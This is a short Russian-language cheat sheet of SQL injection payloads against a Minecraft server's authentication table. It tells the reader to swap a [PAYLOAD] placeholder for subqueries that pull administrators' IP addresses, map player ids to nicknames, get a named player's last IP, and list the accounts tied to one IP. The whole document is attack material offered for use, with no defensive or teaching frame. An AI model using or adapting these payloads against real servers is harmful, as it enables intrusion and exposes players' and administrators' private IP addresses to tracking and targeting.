[PAYLOAD] Включая квадратные скобки заменяем на нужный нам пейлоад:
---------------------------------------------------------------------------------------------------------/
(SELECT GROUP_CONCAT(DISTINCT last_ip SEPARATOR ', ') FROM mc_auth_accounts WHERE player_id LIKE '%admin%') - Узнать айпи адреса администраторов MySQL

(SELECT player_id FROM mc_auth_accounts WHERE id = 182 LIMIT 1) - Узнать ник из айди

(SELECT last_ip FROM mc_auth_accounts WHERE player_id = 'BadikPlay' LIMIT 1) - Узнать айпи из ника

(SELECT GROUP_CONCAT(player_id SEPARATOR ', ') FROM mc_auth_accounts WHERE last_ip = '127.0.0.1') - Список аккаунтов на айпи

